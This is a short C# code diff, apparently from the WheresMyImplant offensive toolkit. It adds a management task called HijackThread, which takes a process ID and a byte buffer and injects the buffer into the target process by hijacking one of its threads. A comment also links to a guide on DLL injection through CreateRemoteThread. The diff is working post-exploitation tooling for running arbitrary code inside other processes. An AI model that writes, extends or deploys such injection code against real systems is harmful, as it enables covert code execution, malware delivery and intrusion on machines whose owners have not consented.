@@ -73,6 +73,34 @@ namespace WheresMyImplant
             }
         }
 
+        [ManagementTask]
+        public static string HijackThread(String strProcessId, Byte[] buffer)
+        {
+            StringBuilder output = new StringBuilder();
+
+            if (!Int32.TryParse(strProcessId, out Int32 dwProcessId))
+            {
+                return "Invalid Process ID: " + strProcessId;
+            }
+
+            using (HijackThread ht = new HijackThread((UInt32)dwProcessId, buffer))
+            {
+                try
+                {
+                    ht.Execute();
+                }
+                catch (Exception ex)
+                {
+                    output.Append(ex.ToString());
+                }
+                finally
+                {
+                    output.Append(ht.GetOutput());
+                }
+            }
+            return output.ToString();
+        }
+
         // Todo: Add Auto Token Privilege Elevation
         [ManagementTask]
         //http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread
